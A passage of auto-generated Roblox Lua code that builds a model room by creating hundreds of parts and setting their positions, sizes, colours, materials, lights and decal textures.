        Part672 = Instance.new("Part")
        Part673 = Instance.new("Part")
        Part674 = Instance.new("Part")
        Part675 = Instance.new("Part")
        Part676 = Instance.new("Part")
        Part677 = Instance.new("Part")
        Part678 = Instance.new("Part")
        Part679 = Instance.new("Part")
        Part680 = Instance.new("Part")
        Model0.Name = " "
        Model0.Parent = mas
        Part1.Parent = Model0
        Part1.CFrame = CFrame.new(49.2000046, 11870.6504, 1.09999788, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part1.Orientation = Vector3.new(0, 180, 0)
        Part1.Position = Vector3.new(49.20000457763672, 11870.650390625, 1.099997878074646)
        Part1.Rotation = Vector3.new(-180, 0, -180)
        Part1.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part1.Size = Vector3.new(0.19999989867210388, 1, 62)
        Part1.Anchored = true
        Part1.BottomSurface = Enum.SurfaceType.Smooth
        Part1.BrickColor = BrickColor.new("Dark stone grey")
        Part1.Material = Enum.Material.SmoothPlastic
        Part1.TopSurface = Enum.SurfaceType.Smooth
        Part1.brickColor = BrickColor.new("Dark stone grey")
        Part2.Parent = Model0
        Part2.CFrame = CFrame.new(43.6499939, 11863.251, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part2.Position = Vector3.new(43.649993896484375, 11863.2509765625, -30.14999008178711)
        Part2.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part2.Size = Vector3.new(5.099998474121094, 2.799999713897705, 0.10000000149011612)
        Part2.Anchored = true
        Part2.BottomSurface = Enum.SurfaceType.Smooth
        Part2.BrickColor = BrickColor.new("White")
        Part2.Material = Enum.Material.SmoothPlastic
        Part2.TopSurface = Enum.SurfaceType.Smooth
        Part2.brickColor = BrickColor.new("White")
        Part3.Parent = Model0
        Part3.CFrame = CFrame.new(49.5999985, 11861.1504, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part3.Position = Vector3.new(49.599998474121094, 11861.150390625, -30.14999008178711)
        Part3.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part3.Size = Vector3.new(6.7999982833862305, 6.999999523162842, 0.10000000149011612)
        Part3.Anchored = true
        Part3.BottomSurface = Enum.SurfaceType.Smooth
        Part3.BrickColor = BrickColor.new("White")
        Part3.Material = Enum.Material.SmoothPlastic
        Part3.TopSurface = Enum.SurfaceType.Smooth
        Part3.brickColor = BrickColor.new("White")
        Part4.Parent = Model0
        Part4.CFrame = CFrame.new(46.1499939, 11859.8506, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part4.Position = Vector3.new(46.149993896484375, 11859.8505859375, -30.14999008178711)
        Part4.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part4.Size = Vector3.new(0.09999990463256836, 4, 0.10000000149011612)
        Part4.Anchored = true
        Part4.BottomSurface = Enum.SurfaceType.Smooth
        Part4.BrickColor = BrickColor.new("Really black")
        Part4.Material = Enum.Material.SmoothPlastic
        Part4.TopSurface = Enum.SurfaceType.Smooth
        Part4.brickColor = BrickColor.new("Really black")
        Part5.Parent = Model0
        Part5.CFrame = CFrame.new(43.6499939, 11861.7998, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part5.Position = Vector3.new(43.649993896484375, 11861.7998046875, -30.14999008178711)
        Part5.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part5.Size = Vector3.new(4.900000095367432, 0.09999996423721313, 0.10000000149011612)
        Part5.Anchored = true
        Part5.BottomSurface = Enum.SurfaceType.Smooth
        Part5.BrickColor = BrickColor.new("Really black")
        Part5.Material = Enum.Material.SmoothPlastic
        Part5.TopSurface = Enum.SurfaceType.Smooth
        Part5.brickColor = BrickColor.new("Really black")
        Part6.Name = "Light"
        Part6.Parent = Model0
        Part6.CFrame = CFrame.new(37.6999931, 11864.1504, -23.1999931, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part6.Position = Vector3.new(37.69999313354492, 11864.150390625, -23.199993133544922)
        Part6.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part6.Transparency = 1
        Part6.Size = Vector3.new(1, 1, 1)
        Part6.Anchored = true
        Part6.BottomSurface = Enum.SurfaceType.Smooth
        Part6.BrickColor = BrickColor.new("Bright yellow")
        Part6.Material = Enum.Material.ForceField
        Part6.TopSurface = Enum.SurfaceType.Smooth
        Part6.brickColor = BrickColor.new("Bright yellow")
        PointLight7.Parent = Part6
        PointLight7.Range = 20
        PointLight7.Shadows = true
        Part8.Parent = Model0
        Part8.CFrame = CFrame.new(49.1500092, 11869.6504, 1.09999859, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part8.Orientation = Vector3.new(0, 180, 0)
        Part8.Position = Vector3.new(49.15000915527344, 11869.650390625, 1.0999985933303833)
        Part8.Rotation = Vector3.new(-180, 0, -180)
        Part8.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part8.Size = Vector3.new(0.09999990463256836, 1, 62)
        Part8.Anchored = true
        Part8.BottomSurface = Enum.SurfaceType.Smooth
        Part8.BrickColor = BrickColor.new("Dark stone grey")
        Part8.Material = Enum.Material.SmoothPlastic
        Part8.TopSurface = Enum.SurfaceType.Smooth
        Part8.brickColor = BrickColor.new("Dark stone grey")
        Part9.Parent = Model0
        Part9.CFrame = CFrame.new(49.2000046, 11868.6504, 1.09999788, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part9.Orientation = Vector3.new(0, 180, 0)
        Part9.Position = Vector3.new(49.20000457763672, 11868.650390625, 1.099997878074646)
        Part9.Rotation = Vector3.new(-180, 0, -180)
        Part9.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part9.Size = Vector3.new(0.19999989867210388, 1, 62)
        Part9.Anchored = true
        Part9.BottomSurface = Enum.SurfaceType.Smooth
        Part9.BrickColor = BrickColor.new("Dark stone grey")
        Part9.Material = Enum.Material.SmoothPlastic
        Part9.TopSurface = Enum.SurfaceType.Smooth
        Part9.brickColor = BrickColor.new("Dark stone grey")
        Part10.Parent = Model0
        Part10.CFrame = CFrame.new(49.2000046, 11867.6504, 1.09999788, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part10.Orientation = Vector3.new(0, 180, 0)
        Part10.Position = Vector3.new(49.20000457763672, 11867.650390625, 1.099997878074646)
        Part10.Rotation = Vector3.new(-180, 0, -180)
        Part10.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part10.Size = Vector3.new(0.19999989867210388, 1, 62)
        Part10.Anchored = true
        Part10.BottomSurface = Enum.SurfaceType.Smooth
        Part10.BrickColor = BrickColor.new("Dark stone grey")
        Part10.Material = Enum.Material.SmoothPlastic
        Part10.TopSurface = Enum.SurfaceType.Smooth
        Part10.brickColor = BrickColor.new("Dark stone grey")
        Part11.Parent = Model0
        Part11.CFrame = CFrame.new(49.1500092, 11866.6504, 1.09999847, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part11.Orientation = Vector3.new(0, 180, 0)
        Part11.Position = Vector3.new(49.15000915527344, 11866.650390625, 1.0999984741210938)
        Part11.Rotation = Vector3.new(-180, 0, -180)
        Part11.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part11.Size = Vector3.new(0.09999990463256836, 1, 62)
        Part11.Anchored = true
        Part11.BottomSurface = Enum.SurfaceType.Smooth
        Part11.BrickColor = BrickColor.new("Dark stone grey")
        Part11.Material = Enum.Material.SmoothPlastic
        Part11.TopSurface = Enum.SurfaceType.Smooth
        Part11.brickColor = BrickColor.new("Dark stone grey")
        Part12.Parent = Model0
        Part12.CFrame = CFrame.new(49.2000046, 11865.6504, 1.09999752, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part12.Orientation = Vector3.new(0, 180, 0)
        Part12.Position = Vector3.new(49.20000457763672, 11865.650390625, 1.0999975204467773)
        Part12.Rotation = Vector3.new(-180, 0, -180)
        Part12.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part12.Size = Vector3.new(0.19999989867210388, 1, 62)
        Part12.Anchored = true
        Part12.BottomSurface = Enum.SurfaceType.Smooth
        Part12.BrickColor = BrickColor.new("Dark stone grey")
        Part12.Material = Enum.Material.SmoothPlastic
        Part12.TopSurface = Enum.SurfaceType.Smooth
        Part12.brickColor = BrickColor.new("Dark stone grey")
        Part13.Parent = Model0
        Part13.CFrame = CFrame.new(52.9499969, 11861.1504, 0.950013161, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part13.Position = Vector3.new(52.94999694824219, 11861.150390625, 0.9500131607055664)
        Part13.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part13.Size = Vector3.new(0.09999978542327881, 7, 62.099998474121094)
        Part13.Anchored = true
        Part13.BottomSurface = Enum.SurfaceType.Smooth
        Part13.BrickColor = BrickColor.new("White")
        Part13.Material = Enum.Material.SmoothPlastic
        Part13.TopSurface = Enum.SurfaceType.Smooth
        Part13.brickColor = BrickColor.new("White")
        Part14.Parent = Model0
        Part14.CFrame = CFrame.new(43.2499847, 11856.6504, -28.9999847, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part14.Position = Vector3.new(43.24998474121094, 11856.650390625, -28.999984741210938)
        Part14.Color = Color3.new(0.992157, 0.917647, 0.552941)
        Part14.Size = Vector3.new(19.299999237060547, 1, 2.1999998092651367)
        Part14.Anchored = true
        Part14.BottomSurface = Enum.SurfaceType.Smooth
        Part14.BrickColor = BrickColor.new("Cool yellow")
        Part14.Material = Enum.Material.SmoothPlastic
        Part14.TopSurface = Enum.SurfaceType.Smooth
        Part14.brickColor = BrickColor.new("Cool yellow")
        Part15.Parent = Model0
        Part15.CFrame = CFrame.new(31.2999935, 11861.251, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part15.Position = Vector3.new(31.29999351501465, 11861.2509765625, -30.14999008178711)
        Part15.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part15.Size = Vector3.new(19.600000381469727, 7.199999809265137, 0.10000000149011612)
        Part15.Anchored = true
        Part15.BottomSurface = Enum.SurfaceType.Smooth
        Part15.BrickColor = BrickColor.new("White")
        Part15.Material = Enum.Material.SmoothPlastic
        Part15.TopSurface = Enum.SurfaceType.Smooth
        Part15.brickColor = BrickColor.new("White")
        Part16.Parent = Model0
        Part16.CFrame = CFrame.new(43.2499924, 11855.751, -29.0499725, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part16.Position = Vector3.new(43.24999237060547, 11855.7509765625, -29.049972534179688)
        Part16.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part16.Size = Vector3.new(19.299999237060547, 3.5999999046325684, 2.0999999046325684)
        Part16.Anchored = true
        Part16.BottomSurface = Enum.SurfaceType.Smooth
        Part16.BrickColor = BrickColor.new("Really black")
        Part16.Material = Enum.Material.Wood
        Part16.TopSurface = Enum.SurfaceType.Smooth
        Part16.brickColor = BrickColor.new("Really black")
        Part17.Parent = Model0
        Part17.CFrame =
            CFrame.new(
            17.3499985,
            11870.6504,
            -29.9999886,
            -1.1920929e-07,
            0,
            1.00000012,
            0,
            1,
            0,
            -1.00000012,
            0,
            -1.1920929e-07
        )
        Part17.Orientation = Vector3.new(0, 90, 0)
        Part17.Position = Vector3.new(17.349998474121094, 11870.650390625, -29.999988555908203)
        Part17.Rotation = Vector3.new(0, 90, 0)
        Part17.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part17.Size = Vector3.new(0.19999989867210388, 1, 63.900001525878906)
        Part17.Anchored = true
        Part17.BottomSurface = Enum.SurfaceType.Smooth
        Part17.BrickColor = BrickColor.new("Dark stone grey")
        Part17.Material = Enum.Material.SmoothPlastic
        Part17.TopSurface = Enum.SurfaceType.Smooth
        Part17.brickColor = BrickColor.new("Dark stone grey")
        Part18.Parent = Model0
        Part18.CFrame =
            CFrame.new(
            17.3499947,
            11869.6504,
            -29.9499779,
            -1.1920929e-07,
            0,
            1.00000012,
            0,
            1,
            0,
            -1.00000012,
            0,
            -1.1920929e-07
        )
        Part18.Orientation = Vector3.new(0, 90, 0)
        Part18.Position = Vector3.new(17.349994659423828, 11869.650390625, -29.94997787475586)
        Part18.Rotation = Vector3.new(0, 90, 0)
        Part18.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part18.Size = Vector3.new(0.09999989718198776, 1, 63.69999694824219)
        Part18.Anchored = true
        Part18.BottomSurface = Enum.SurfaceType.Smooth
        Part18.BrickColor = BrickColor.new("Dark stone grey")
        Part18.Material = Enum.Material.SmoothPlastic
        Part18.TopSurface = Enum.SurfaceType.Smooth
        Part18.brickColor = BrickColor.new("Dark stone grey")
        Part19.Parent = Model0
        Part19.CFrame = CFrame.new(43.2499809, 11857.6006, -28.9999847, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part19.Position = Vector3.new(43.24998092651367, 11857.6005859375, -28.999984741210938)
        Part19.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part19.Size = Vector3.new(19.299999237060547, 0.09999996423721313, 2.200000047683716)
        Part19.Anchored = true
        Part19.BottomSurface = Enum.SurfaceType.Smooth
        Part19.BrickColor = BrickColor.new("Really black")
        Part19.Material = Enum.Material.SmoothPlastic
        Part19.TopSurface = Enum.SurfaceType.Smooth
        Part19.brickColor = BrickColor.new("Really black")
        Part20.Parent = Model0
        Part20.CFrame = CFrame.new(41.1499939, 11859.8506, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part20.Position = Vector3.new(41.149993896484375, 11859.8505859375, -30.14999008178711)
        Part20.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part20.Size = Vector3.new(0.09999990463256836, 4, 0.10000000149011612)
        Part20.Anchored = true
        Part20.BottomSurface = Enum.SurfaceType.Smooth
        Part20.BrickColor = BrickColor.new("Really black")
        Part20.Material = Enum.Material.SmoothPlastic
        Part20.TopSurface = Enum.SurfaceType.Smooth
        Part20.brickColor = BrickColor.new("Really black")
        Part21.Parent = Model0
        Part21.CFrame = CFrame.new(43.6499939, 11857.9004, -30.1499977, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part21.Position = Vector3.new(43.649993896484375, 11857.900390625, -30.14999771118164)
        Part21.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part21.Size = Vector3.new(4.899999618530273, 0.09999996423721313, 0.09999989718198776)
        Part21.Anchored = true
        Part21.BottomSurface = Enum.SurfaceType.Smooth
        Part21.BrickColor = BrickColor.new("Really black")
        Part21.Material = Enum.Material.SmoothPlastic
        Part21.TopSurface = Enum.SurfaceType.Smooth
        Part21.brickColor = BrickColor.new("Really black")
        Part22.Parent = Model0
        Part22.CFrame = CFrame.new(43.6499939, 11857.751, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part22.Position = Vector3.new(43.649993896484375, 11857.7509765625, -30.14999008178711)
        Part22.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part22.Size = Vector3.new(5.099998474121094, 0.19999942183494568, 0.10000000149011612)
        Part22.Anchored = true
        Part22.BottomSurface = Enum.SurfaceType.Smooth
        Part22.BrickColor = BrickColor.new("White")
        Part22.Material = Enum.Material.SmoothPlastic
        Part22.TopSurface = Enum.SurfaceType.Smooth
        Part22.brickColor = BrickColor.new("White")
        Part23.Parent = Model0
        Part23.CFrame = CFrame.new(51.1999893, 11859.4658, -6.68997478, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part23.Orientation = Vector3.new(0, 90, 0)
        Part23.Position = Vector3.new(51.199989318847656, 11859.4658203125, -6.689974784851074)
        Part23.Rotation = Vector3.new(0, 90, 0)
        Part23.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part23.Anchored = true
        Part23.BottomSurface = Enum.SurfaceType.Smooth
        Part23.Material = Enum.Material.Fabric
        Part23.TopSurface = Enum.SurfaceType.Smooth
        Decal24.Parent = Part23
        Decal24.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal25.Parent = Part23
        Decal25.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal25.Face = Enum.NormalId.Back
        Decal26.Parent = Part23
        Decal26.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal26.Face = Enum.NormalId.Left
        Decal27.Parent = Part23
        Decal27.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal27.Face = Enum.NormalId.Right
        Decal28.Parent = Part23
        Decal28.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal28.Face = Enum.NormalId.Bottom
        Decal29.Parent = Part23
        Decal29.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal29.Face = Enum.NormalId.Top
        Part30.Parent = Model0
        Part30.CFrame = CFrame.new(51.1999893, 11859.4658, 1.31001937, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part30.Orientation = Vector3.new(0, 90, 0)
        Part30.Position = Vector3.new(51.199989318847656, 11859.4658203125, 1.3100193738937378)
        Part30.Rotation = Vector3.new(0, 90, 0)
        Part30.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part30.Anchored = true
        Part30.BottomSurface = Enum.SurfaceType.Smooth
        Part30.Material = Enum.Material.Fabric
        Part30.TopSurface = Enum.SurfaceType.Smooth
        Decal31.Parent = Part30
        Decal31.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal32.Parent = Part30
        Decal32.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal32.Face = Enum.NormalId.Back
        Decal33.Parent = Part30
        Decal33.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal33.Face = Enum.NormalId.Left
        Decal34.Parent = Part30
        Decal34.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal34.Face = Enum.NormalId.Right
        Decal35.Parent = Part30
        Decal35.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal35.Face = Enum.NormalId.Bottom
        Decal36.Parent = Part30
        Decal36.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal36.Face = Enum.NormalId.Top
        Part37.Name = "Light"
        Part37.Parent = Model0
        Part37.CFrame = CFrame.new(37.6999931, 11864.1504, 8.80000687, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part37.Position = Vector3.new(37.69999313354492, 11864.150390625, 8.800006866455078)
        Part37.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part37.Transparency = 1
        Part37.Size = Vector3.new(1, 1, 1)
        Part37.Anchored = true
        Part37.BottomSurface = Enum.SurfaceType.Smooth
        Part37.BrickColor = BrickColor.new("Bright yellow")
        Part37.Material = Enum.Material.ForceField
        Part37.TopSurface = Enum.SurfaceType.Smooth
        Part37.brickColor = BrickColor.new("Bright yellow")
        PointLight38.Parent = Part37
        PointLight38.Range = 20
        PointLight38.Shadows = true
        Part39.Parent = Model0
        Part39.CFrame = CFrame.new(15.9000006, 11871.0498, 5.60000324, 0, 1, 0, -1, 0, 0, 0, 0, 1)
        Part39.Orientation = Vector3.new(0, 0, -90)
        Part39.Position = Vector3.new(15.90000057220459, 11871.0498046875, 5.600003242492676)
        Part39.Rotation = Vector3.new(0, 0, -90)
        Part39.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part39.Size = Vector3.new(0.19999989867210388, 66.39999389648438, 14.799999237060547)
        Part39.Anchored = true
        Part39.BottomSurface = Enum.SurfaceType.Smooth
        Part39.BrickColor = BrickColor.new("Dark stone grey")
        Part39.Material = Enum.Material.SmoothPlastic
        Part39.TopSurface = Enum.SurfaceType.Smooth
        Part39.brickColor = BrickColor.new("Dark stone grey")
        Part40.Parent = Model0
        Part40.CFrame = CFrame.new(17.3500004, 11871.0498, -15.8499889, 0, 1, 0, -1, 0, 0, 0, 0, 1)
        Part40.Orientation = Vector3.new(0, 0, -90)
        Part40.Position = Vector3.new(17.350000381469727, 11871.0498046875, -15.84998893737793)
        Part40.Rotation = Vector3.new(0, 0, -90)
        Part40.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part40.Size = Vector3.new(0.19999989867210388, 63.5, 28.099998474121094)
        Part40.Anchored = true
        Part40.BottomSurface = Enum.SurfaceType.Smooth
        Part40.BrickColor = BrickColor.new("Dark stone grey")
        Part40.Material = Enum.Material.SmoothPlastic
        Part40.TopSurface = Enum.SurfaceType.Smooth
        Part40.brickColor = BrickColor.new("Dark stone grey")
        Part41.Parent = Model0
        Part41.CFrame = CFrame.new(52.9499969, 11855.7998, 1.00001621, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part41.Position = Vector3.new(52.94999694824219, 11855.7998046875, 1.000016212463379)
        Part41.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part41.Size = Vector3.new(0.10000000149011612, 3.6999998092651367, 62.20000076293945)
        Part41.Anchored = true
        Part41.BottomSurface = Enum.SurfaceType.Smooth
        Part41.BrickColor = BrickColor.new("Mid gray")
        Part41.Material = Enum.Material.Cobblestone
        Part41.TopSurface = Enum.SurfaceType.Smooth
        Part41.brickColor = BrickColor.new("Mid gray")
        Part42.Parent = Model0
        Part42.CFrame = CFrame.new(23.1000023, 11864.9004, -0.84999752, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part42.Position = Vector3.new(23.10000228881836, 11864.900390625, -0.8499975204467773)
        Part42.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part42.Size = Vector3.new(59.79999923706055, 0.4999999701976776, 65.9000015258789)
        Part42.Anchored = true
        Part42.BottomSurface = Enum.SurfaceType.Smooth
        Part42.BrickColor = BrickColor.new("White")
        Part42.Material = Enum.Material.SmoothPlastic
        Part42.TopSurface = Enum.SurfaceType.Smooth
        Part42.brickColor = BrickColor.new("White")
        Part43.Parent = Model0
        Part43.CFrame =
            CFrame.new(
            17.3499985,
            11868.6504,
            -29.9999886,
            -1.1920929e-07,
            0,
            1.00000012,
            0,
            1,
            0,
            -1.00000012,
            0,
            -1.1920929e-07
        )
        Part43.Orientation = Vector3.new(0, 90, 0)
        Part43.Position = Vector3.new(17.349998474121094, 11868.650390625, -29.999988555908203)
        Part43.Rotation = Vector3.new(0, 90, 0)
        Part43.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part43.Size = Vector3.new(0.19999989867210388, 1, 63.900001525878906)
        Part43.Anchored = true
        Part43.BottomSurface = Enum.SurfaceType.Smooth
        Part43.BrickColor = BrickColor.new("Dark stone grey")
        Part43.Material = Enum.Material.SmoothPlastic
        Part43.TopSurface = Enum.SurfaceType.Smooth
        Part43.brickColor = BrickColor.new("Dark stone grey")
        Part44.Parent = Model0
        Part44.CFrame =
            CFrame.new(
            17.3499985,
            11867.6504,
            -29.9999886,
            -1.1920929e-07,
            0,
            1.00000012,
            0,
            1,
            0,
            -1.00000012,
            0,
            -1.1920929e-07
        )
        Part44.Orientation = Vector3.new(0, 90, 0)
        Part44.Position = Vector3.new(17.349998474121094, 11867.650390625, -29.999988555908203)
        Part44.Rotation = Vector3.new(0, 90, 0)
        Part44.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part44.Size = Vector3.new(0.19999989867210388, 1, 63.900001525878906)
        Part44.Anchored = true
        Part44.BottomSurface = Enum.SurfaceType.Smooth
        Part44.BrickColor = BrickColor.new("Dark stone grey")
        Part44.Material = Enum.Material.SmoothPlastic
        Part44.TopSurface = Enum.SurfaceType.Smooth
        Part44.brickColor = BrickColor.new("Dark stone grey")
        Part45.Parent = Model0
        Part45.CFrame =
            CFrame.new(
            17.3499947,
            11866.6504,
            -29.9499779,
            -1.1920929e-07,
            0,
            1.00000012,
            0,
            1,
            0,
            -1.00000012,
            0,
            -1.1920929e-07
        )
        Part45.Orientation = Vector3.new(0, 90, 0)
        Part45.Position = Vector3.new(17.349994659423828, 11866.650390625, -29.94997787475586)
        Part45.Rotation = Vector3.new(0, 90, 0)
        Part45.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part45.Size = Vector3.new(0.09999989718198776, 1, 63.70000076293945)
        Part45.Anchored = true
        Part45.BottomSurface = Enum.SurfaceType.Smooth
        Part45.BrickColor = BrickColor.new("Dark stone grey")
        Part45.Material = Enum.Material.SmoothPlastic
        Part45.TopSurface = Enum.SurfaceType.Smooth
        Part45.brickColor = BrickColor.new("Dark stone grey")
        Part46.Parent = Model0
        Part46.CFrame =
            CFrame.new(
            17.3499985,
            11865.6504,
            -29.9999886,
            -1.1920929e-07,
            0,
            1.00000012,
            0,
            1,
            0,
            -1.00000012,
            0,
            -1.1920929e-07
        )
        Part46.Orientation = Vector3.new(0, 90, 0)
        Part46.Position = Vector3.new(17.349998474121094, 11865.650390625, -29.999988555908203)
        Part46.Rotation = Vector3.new(0, 90, 0)
        Part46.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part46.Size = Vector3.new(0.19999989867210388, 1, 63.900001525878906)
        Part46.Anchored = true
        Part46.BottomSurface = Enum.SurfaceType.Smooth
        Part46.BrickColor = BrickColor.new("Dark stone grey")
        Part46.Material = Enum.Material.SmoothPlastic
        Part46.TopSurface = Enum.SurfaceType.Smooth
        Part46.brickColor = BrickColor.new("Dark stone grey")
        Part47.Parent = Model0
        Part47.CFrame = CFrame.new(18.9499931, 11863.251, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part47.Position = Vector3.new(18.949993133544922, 11863.2509765625, -30.14999008178711)
        Part47.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part47.Size = Vector3.new(5.099998474121094, 2.799999713897705, 0.10000000149011612)
        Part47.Anchored = true
        Part47.BottomSurface = Enum.SurfaceType.Smooth
        Part47.BrickColor = BrickColor.new("White")
        Part47.Material = Enum.Material.SmoothPlastic
        Part47.TopSurface = Enum.SurfaceType.Smooth
        Part47.brickColor = BrickColor.new("White")
        Part48.Parent = Model0
        Part48.CFrame = CFrame.new(18.9499931, 11861.7998, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part48.Position = Vector3.new(18.949993133544922, 11861.7998046875, -30.14999008178711)
        Part48.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part48.Size = Vector3.new(4.900000095367432, 0.09999996423721313, 0.10000000149011612)
        Part48.Anchored = true
        Part48.BottomSurface = Enum.SurfaceType.Smooth
        Part48.BrickColor = BrickColor.new("Really black")
        Part48.Material = Enum.Material.SmoothPlastic
        Part48.TopSurface = Enum.SurfaceType.Smooth
        Part48.brickColor = BrickColor.new("Really black")
        Part49.Parent = Model0
        Part49.CFrame = CFrame.new(21.4499931, 11859.8506, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part49.Position = Vector3.new(21.449993133544922, 11859.8505859375, -30.14999008178711)
        Part49.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part49.Size = Vector3.new(0.09999990463256836, 4, 0.10000000149011612)
        Part49.Anchored = true
        Part49.BottomSurface = Enum.SurfaceType.Smooth
        Part49.BrickColor = BrickColor.new("Really black")
        Part49.Material = Enum.Material.SmoothPlastic
        Part49.TopSurface = Enum.SurfaceType.Smooth
        Part49.brickColor = BrickColor.new("Really black")
        Part50.Parent = Model0
        Part50.CFrame = CFrame.new(16.4499931, 11859.8506, -30.1499901, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part50.Position = Vector3.new(16.449993133544922, 11859.8505859375, -30.14999008178711)
        Part50.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part50.Size = Vector3.new(0.09999990463256836, 4, 0.10000000149011612)
        Part50.Anchored = true
        Part50.BottomSurface = Enum.SurfaceType.Smooth
        Part50.BrickColor = BrickColor.new("Really black")
        Part50.Material = Enum.Material.SmoothPlastic
        Part50.TopSurface = Enum.SurfaceType.Smooth
        Part50.brickColor = BrickColor.new("Really black")
        Part51.Parent = Model0
        Part51.CFrame = CFrame.new(37.3499908, 11855.251, -4.89999056, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part51.Position = Vector3.new(37.34999084472656, 11855.2509765625, -4.899990558624268)
        Part51.Color = Color3.new(0.972549, 0.972549, 0.972549)
        Part51.Size = Vector3.new(9.100000381469727, 2.5999999046325684, 21.19999885559082)
        Part51.Anchored = true
        Part51.BottomSurface = Enum.SurfaceType.Smooth
        Part51.BrickColor = BrickColor.new("Institutional white")
        Part51.Material = Enum.Material.Marble
        Part51.TopSurface = Enum.SurfaceType.Smooth
        Part51.brickColor = BrickColor.new("Institutional white")
        Part52.Parent = Model0
        Part52.CFrame = CFrame.new(51.1999893, 11855.665, -6.68997478, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part52.Orientation = Vector3.new(0, 90, 0)
        Part52.Position = Vector3.new(51.199989318847656, 11855.6650390625, -6.689974784851074)
        Part52.Rotation = Vector3.new(0, 90, 0)
        Part52.Size = Vector3.new(7.579999923706055, 3.4300003051757812, 3.4000003337860107)
        Part52.Anchored = true
        Part52.BottomSurface = Enum.SurfaceType.Smooth
        Part52.Material = Enum.Material.Fabric
        Part52.TopSurface = Enum.SurfaceType.Smooth
        Decal53.Parent = Part52
        Decal53.Texture = "http://www.roblox.com/asset/?id=62967748"
        Decal54.Parent = Part52
        Decal54.Texture = "http://www.roblox.com/asset/?id=62967724"
        Decal54.Face = Enum.NormalId.Back
        Decal55.Parent = Part52
        Decal55.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal55.Face = Enum.NormalId.Left
        Decal56.Parent = Part52
        Decal56.Texture = "http://www.roblox.com/asset/?id=3164651356"
        Decal56.Face = Enum.NormalId.Right
        Decal57.Parent = Part52
        Decal57.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal57.Face = Enum.NormalId.Bottom
        Decal58.Parent = Part52
        Decal58.Texture = "http://www.roblox.com/asset/?id=151807783"
        Decal58.Face = Enum.NormalId.Top
        Part59.Parent = Model0
